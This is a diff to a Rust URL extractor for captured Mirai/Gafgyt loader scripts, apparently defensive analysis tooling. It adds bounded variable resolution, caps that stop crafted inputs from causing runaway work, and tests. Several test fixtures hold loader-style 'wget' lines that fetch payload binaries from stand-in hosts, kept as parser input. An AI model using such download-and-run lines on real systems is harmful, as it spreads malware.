@@ -8,9 +8,11 @@
 //! This is deliberately NOT a shell interpreter. It resolves exactly two constructs real captured
 //! loaders use:
 //! - simple scalar assignments (`VAR="value"` / `VAR='value'` / `VAR=word`, one per line, last
-//!   assignment wins, values may reference earlier vars);
+//!   assignment wins, values may reference any other var in the body - forward or backward -
+//!   resolved to a bounded, cycle-safe fixed point, see [`resolve_fixed_point`]);
 //! - a single level of `for VAR in WORDS; do` where `WORDS` is either literal whitespace-separated
-//!   words or a single `$OTHERVAR` resolved from the assignment map.
+//!   words or a single `$OTHERVAR` resolved from the assignment map, truncated to `MAX_URLS` words
+//!   before any expansion runs.
 //!
 //! Command substitution (`` $(...) ``, backticks), arithmetic (`$((...))`), parameter expansion
 //! (`${VAR:-default}`), and nested loops are out of scope: any URL token that still contains an
@@ -18,6 +20,14 @@
 //! than emitted as a broken template. `tftp -g -r <file> <host>` is synthesized into a
 //! `tftp://<host>/<file>` URL using the same assignment substitution, but without loop expansion -
 //! no captured loader has needed it, and adding it would widen the scope for no observed benefit.
+//!
+//! Total expansion work is bounded independent of any attacker-controlled repetition: a loop's
+//! word list is truncated to `MAX_URLS` before expansion (so one url-token template expands to at
+//! most `MAX_URLS` candidates, accepted or rejected), and the whole scan returns immediately once
+//! `MAX_URLS` accepted urls have been emitted (so no further template is expanded at all). Without
+//! both of these, a crafted body (a huge poisoned word list plus many repeated template lines that
+//! never resolve) can drive tens of millions of rejected-candidate iterations in one synchronous
+//! call, since a rejected candidate never touches the accepted-url cap.
 
 use std::collections::{HashMap, HashSet};
 
@@ -49,6 +59,13 @@ pub fn extract_urls(body: &[u8]) -> Vec<String> {
     let mut seen = HashSet::new();
 
     for raw in scan_url_tokens(text) {
+        // Check before doing any expansion work for this token, not just before accepting a
+        // result: expand_token's internal loop is the expensive part, so once the cap is hit,
+        // no further token should be expanded at all, regardless of how many raw tokens
+        // scan_url_tokens found or how many of them are attacker-repeated identical templates.
+        if urls.len() >= MAX_URLS {
+            return urls;
+        }
         for url in expand_token(&raw, &vars, &loops) {
             if urls.len() >= MAX_URLS {
                 return urls;
@@ -77,11 +94,17 @@ pub fn extract_urls(body: &[u8]) -> Vec<String> {
     urls
 }
 
+/// Bound on fixed-point resolution passes over the assignment map (see [`resolve_fixed_point`]).
+/// Generous for any realistic indirection depth in a captured loader, and cheap regardless: each
+/// pass is O(total assignment text), which is itself bounded by `MAX_BODY_LEN`.
+const MAX_RESOLVE_PASSES: usize = 8;
+
 /// Parse simple `VAR="value"` / `VAR='value'` / `VAR=word` assignments, one per line. Later
-/// assignments to the same name overwrite earlier ones (processed top-to-bottom), and a value may
-/// reference vars assigned on earlier lines (already-resolved by the time this line runs).
+/// assignments to the same name overwrite earlier ones (processed top-to-bottom). A value may
+/// reference a var assigned EARLIER OR LATER in the body - `resolve_fixed_point` re-resolves the
+/// whole map until stable, so a forward reference (`A=$B` before `B` is assigned) still resolves.
 fn parse_assignments(text: &str) -> HashMap<String, String> {
-    let mut vars: HashMap<String, String> = HashMap::new();
+    let mut raw: HashMap<String, String> = HashMap::new();
     for line in text.lines() {
         let trimmed = line.trim_start();
         let Some(name_len) = leading_ident_len(trimmed) else {
@@ -92,10 +115,34 @@ fn parse_assignments(text: &str) -> HashMap<String, String> {
         }
         let name = &trimmed[..name_len];
         let rest = &trimmed[name_len + 1..];
-        let value = parse_assignment_value(rest, &vars);
-        vars.insert(name.to_string(), value);
+        raw.insert(name.to_string(), raw_assignment_value(rest).to_string());
     }
-    vars
+    resolve_fixed_point(raw)
+}
+
+/// Re-substitute every value against the full map, repeatedly, until nothing changes or
+/// `MAX_RESOLVE_PASSES` is reached. Cycle-safe: a self- or mutually-referential chain (`A=$A`,
+/// or `A=$B` / `B=$A`) stops changing after at most one pass (each side settles on the other's
+/// still-unresolved literal `$NAME` text) and the loop exits via the `!changed` check - it never
+/// spins on a cycle, and simply leaves the unresolved `$` in place for the caller to drop.
+fn resolve_fixed_point(raw: HashMap<String, String>) -> HashMap<String, String> {
+    let mut current = raw;
+    for _ in 0..MAX_RESOLVE_PASSES {
+        let mut changed = false;
+        let mut next = HashMap::with_capacity(current.len());
+        for (name, value) in &current {
+            let substituted = substitute_vars(value, &current);
+            if &substituted != value {
+                changed = true;
+            }
+            next.insert(name.clone(), substituted);
+        }
+        current = next;
+        if !changed {
+            break;
+        }
+    }
+    current
 }
 
 /// Length in bytes of a leading shell identifier (`[A-Za-z_][A-Za-z0-9_]*`) at the start of `s`,
@@ -116,10 +163,11 @@ fn leading_ident_len(s: &str) -> Option<usize> {
     Some(end)
 }
 
-/// Extract the raw value text after `VAR=` (quote-stripped or the first unquoted word) and
-/// resolve any `$VAR` / `${VAR}` references against already-assigned vars.
-fn parse_assignment_value(rest: &str, vars: &HashMap<String, String>) -> String {
-    let raw_value = if let Some(stripped) = rest.strip_prefix('"') {
+/// Extract the raw value text after `VAR=` (quote-stripped, or the first unquoted word),
+/// unsubstituted - `resolve_fixed_point` handles `$VAR` references afterward, once the whole map
+/// is known.
+fn raw_assignment_value(rest: &str) -> &str {
+    if let Some(stripped) = rest.strip_prefix('"') {
         stripped.find('"').map_or(stripped, |end| &stripped[..end])
     } else if let Some(stripped) = rest.strip_prefix('\'') {
         stripped.find('\'').map_or(stripped, |end| &stripped[..end])
@@ -128,8 +176,7 @@ fn parse_assignment_value(rest: &str, vars: &HashMap<String, String>) -> String 
             .find(|c: char| c.is_whitespace() || c == ';' || c == '#')
             .unwrap_or(rest.len());
         &rest[..end]
-    };
-    substitute_vars(raw_value, vars)
+    }
 }
 
 /// Parse `for VAR in WORDS; do` (or `for VAR in WORDS do`, or a `for` line whose `WORDS` runs to
@@ -169,7 +216,7 @@ fn parse_for_loops(text: &str, vars: &HashMap<String, String>) -> HashMap<String
             words.push(tok.to_string());
         }
 
-        let resolved = if words.len() == 1 {
+        let mut resolved = if words.len() == 1 {
             match single_var_ref(&words[0]) {
                 Some(name) => vars
                     .get(&name)
@@ -180,7 +227,19 @@ fn parse_for_loops(text: &str, vars: &HashMap<String, String>) -> HashMap<String
         } else {
             words
         };
+        // Cap the candidate word list before any expansion happens: expand_token iterates
+        // every word for every matching url token found in the body, so an uncapped list
+        // (e.g. a crafted "ARCHS" with tens of thousands of words) makes that iteration cost
+        // attacker-controlled and unbounded by MAX_URLS, since a rejected (still-unresolved)
+        // candidate never reaches the accepted-url cap check. Truncating here bounds total
+        // expansion work to (url tokens found in the body) x MAX_URLS regardless of how large
+        // or how many times a loop's word list is referenced.
+        resolved.truncate(MAX_URLS);
 
+        // Intentionally global and last-assignment-wins: if the body reuses the same loop
+        // variable name across two different `for` loops, the later loop's word list wins for
+        // both. Out of scope to fix - real captured Mirai/Gafgyt loaders use exactly one arch
+        // loop.
         loops.insert(loop_var.to_string(), resolved);
     }
     loops
@@ -468,5 +527,84 @@ done
         let urls = extract_urls(body.as_bytes());
         assert_eq!(urls.len(), 256);
         assert!(urls.iter().all(|u| !u.contains('$')));
+    }
+
+    /// A crafted adversarial input: a for-loop word list where every word is itself
+    /// unresolvable (so every candidate the loop expansion produces is REJECTED, never
+    /// touching the accepted-url cap), combined with as many repeated template lines
+    /// referencing that loop var as fit under the 64 KB body cap. Before per-loop word-list
+    /// truncation, this drove (repeated template count) x (word list length) rejected
+    /// expansion iterations - millions, entirely attacker-controlled and independent of
+    /// MAX_URLS. See task-7-report.md for the mutation-verified pre-fix timing on this exact
+    /// input.
+    #[test]
+    fn bounds_expansion_work_against_poisoned_repeated_templates() {
+        // W (word-list length) and K (repeated template count) are both well past what a real
+        // loader needs, chosen so pre-fix work (K x W ~= 2.5M rejected iterations) is clearly
+        // unbounded by MAX_URLS while post-fix work (K x min(W, MAX_URLS) ~= 128K) still finishes
+        // fast - see task-7-report.md for the mutation-verified timing comparison on this input.
+        const W: usize = 5_000;
+        const K: usize = 500;
+        let poisoned_words: Vec<String> = (0..W).map(|i| format!("$X{i}")).collect();
+        let archs_value = poisoned_words.join(" ");
+        let mut body = format!("ARCHS=\"{archs_value}\"\nfor arch in $ARCHS; do\n");
+        let template_line = "wget http://h/p.$arch\n";
+        for _ in 0..K {
+            body.push_str(template_line);
+        }
+        body.push_str("done\n");
+        assert!(
+            body.len() <= MAX_BODY_LEN,
+            "test body must itself respect the 64KB cap: {}",
+            body.len()
+        );
+
+        let start = std::time::Instant::now();
+        let urls = extract_urls(body.as_bytes());
+        let elapsed = start.elapsed();
+
+        // Structural bound: never exceeds the cap, and here (every word is genuinely
+        // unresolvable, no $Xn is ever assigned) the correct result is empty.
+        assert!(
+            urls.len() <= 256,
+            "must never exceed the cap, got {}",
+            urls.len()
+        );
+        assert!(
+            urls.is_empty(),
+            "no candidate here is resolvable, got {urls:?}"
+        );
+        // Not a precise perf gate (the real proof is the mutation-verified timing in the
+        // report) - just a generous hang guard, since the fixed version finishes in well
+        // under a second on this input.
+        assert!(
+            elapsed.as_secs() < 5,
+            "expansion work must be bounded regardless of the attacker's repetition factor, took {elapsed:?}"
+        );
+    }
+
+    #[test]
+    fn resolves_forward_referenced_variable_chain() {
+        // A is assigned before B, referencing it; B is assigned on a LATER line. A single
+        // top-to-bottom pass would leave A as the literal "$B" forever.
+        let s = b"A=$B\nB=host.example\nwget http://$A/payload.bin\n";
+        let urls = extract_urls(s);
+        assert_eq!(urls, vec!["http://host.example/payload.bin".to_string()]);
+    }
+
+    #[test]
+    fn self_referential_assignment_terminates_without_hang() {
+        let s = b"A=$A\nwget http://$A/x.bin\n";
+        let start = std::time::Instant::now();
+        let urls = extract_urls(s);
+        let elapsed = start.elapsed();
+        assert!(
+            urls.is_empty(),
+            "a self-reference must not resolve: {urls:?}"
+        );
+        assert!(
+            elapsed.as_secs() < 2,
+            "a self-reference must terminate quickly, took {elapsed:?}"
+        );
     }
 }
